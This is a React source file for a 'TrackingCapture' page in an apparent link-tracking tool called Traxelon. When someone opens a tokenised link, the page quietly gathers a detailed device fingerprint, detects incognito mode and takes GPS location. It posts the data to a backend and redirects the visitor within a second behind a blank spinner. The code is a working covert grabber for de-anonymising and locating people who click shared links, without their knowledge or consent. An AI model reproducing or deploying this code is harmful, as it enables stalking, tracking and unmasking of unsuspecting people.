import React, { useEffect, useRef } from "react";
import { useParams } from "react-router-dom";
import { useGeoGrabber } from "../hooks/useGeoGrabber";

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || "http://localhost:5001";

function getCaptureKey(token) {
  return "traxelon_captured_v4_" + token;
}

// ── Canvas fingerprint ────────────────────────────────────────
function getCanvasFingerprint() {
  try {
    const canvas = document.createElement("canvas");
    canvas.width = 200;
    canvas.height = 50;
    const ctx = canvas.getContext("2d");
    ctx.textBaseline = "top";
    ctx.font = "14px Arial";
    ctx.fillStyle = "#f60";
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = "#069";
    ctx.fillText("Traxelon", 2, 15);
    ctx.fillStyle = "rgba(102,204,0,0.7)";
    ctx.fillText("Traxelon", 4, 17);
    const dataUrl = canvas.toDataURL();
    let hash = 0;
    for (let i = 0; i < dataUrl.length; i++) {
      hash = (hash << 5) - hash + dataUrl.charCodeAt(i);
      hash |= 0;
    }
    return hash.toString(16);
  } catch {
    return null;
  }
}

// ── WebGL GPU info ────────────────────────────────────────────
function getGPUInfo() {
  try {
    const canvas = document.createElement("canvas");
    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    if (!gl) return { gpu: null, gpuVendor: null };
    const ext = gl.getExtension("WEBGL_debug_renderer_info");
    if (!ext) return { gpu: null, gpuVendor: null };
    return {
      gpu: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) || null,
      gpuVendor: gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) || null,
    };
  } catch {
    return { gpu: null, gpuVendor: null };
  }
}

// ── Battery info ──────────────────────────────────────────────
async function getBatteryInfo() {
  try {
    if (!navigator.getBattery) return {};
    const battery = await navigator.getBattery();
    return {
      batteryLevel: Math.round(battery.level * 100),
      batteryCharging: battery.charging,
    };
  } catch {
    return {};
  }
}

// ── Incognito detection ───────────────────────────────────────
async function detectIncognito() {
  try {
    if (navigator.storage && navigator.storage.estimate) {
      const { quota } = await navigator.storage.estimate();
      return quota < 120 * 1024 * 1024;
    }
    return null;
  } catch {
    return null;
  }
}

// ── Network info ──────────────────────────────────────────────
function getNetworkInfo() {
  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  if (!conn) return {};
  return {
    connectionType: conn.effectiveType || null,
    connectionDownlink: conn.downlink || null,
    connectionRtt: conn.rtt || null,
    connectionSaveData: conn.saveData || false,
  };
}

// ── Collect all device info ───────────────────────────────────
async function collectDeviceInfo() {
  const [battery, incognito] = await Promise.all([
    getBatteryInfo(),
    detectIncognito(),
  ]);
  const { gpu, gpuVendor } = getGPUInfo();
  const network = getNetworkInfo();
  const canvasHash = getCanvasFingerprint();

  return {
    cpuCores: navigator.hardwareConcurrency || null,
    ram: navigator.deviceMemory || null,
    gpu,
    gpuVendor,
    maxTouchPoints: navigator.maxTouchPoints || null,
    batteryLevel: battery.batteryLevel || null,
    batteryCharging: battery.batteryCharging || null,
    screenWidth: window.screen.width,
    screenHeight: window.screen.height,
    screenAvailWidth: window.screen.availWidth || null,
    screenAvailHeight: window.screen.availHeight || null,
    colorDepth: window.screen.colorDepth || null,
    pixelDepth: window.screen.pixelDepth || null,
    pixelRatio: window.devicePixelRatio || null,
    windowWidth: window.innerWidth || null,
    windowHeight: window.innerHeight || null,
    language: navigator.language || null,
    languages: navigator.languages ? navigator.languages.join(", ") : null,
    platform: navigator.platform || null,
    cookiesEnabled: navigator.cookieEnabled || null,
    doNotTrack: navigator.doNotTrack || null,
    historyLength: window.history.length || null,
    referrer: document.referrer || null,
    ...network,
    incognito: incognito || null,
    canvasHash,
  };
}

export default function TrackingCapture() {
  const { token } = useParams();
  const hasSent = useRef(false);
  const { location, loading } = useGeoGrabber();

  useEffect(() => {
    if (loading) return;
    if (hasSent.current) return;
    const key = getCaptureKey(token);
    if (sessionStorage.getItem(key)) return;
    hasSent.current = true;
    sessionStorage.setItem(key, "1");
    sendCapture(location);
  }, [loading, location]);

  async function sendCapture(loc) {
    try {
      const deviceInfo = await collectDeviceInfo();

      const payload = {
        token,
        gpsLat: loc?.source === "gps" ? (loc.lat || null) : null,
        gpsLon: loc?.source === "gps" ? (loc.lon || null) : null,
        gpsAccuracy: loc?.source === "gps" ? (loc.gpsAccuracy || null) : null,
        ...deviceInfo,
      };

      const res = await fetch(BACKEND_URL + "/api/links/capture", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      const data = await res.json();
      if (data.destinationUrl) {
        window.location.replace(data.destinationUrl);
      }
    } catch (err) {
      console.error("[TrackingCapture] error:", err);
    }
  }

  // Blank white screen with spinner — visible for < 1 second
  return (
    <div style={{
      minHeight: "100vh",
      background: "#fff",
      display: "flex",
      alignItems: "center",
      justifyContent: "center",
    }}>
      <div style={{
        width: 32,
        height: 32,
        border: "3px solid #eee",
        borderTop: "3px solid #555",
        borderRadius: "50%",
        animation: "spin 0.8s linear infinite"
      }} />
      <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
    </div>
  );
}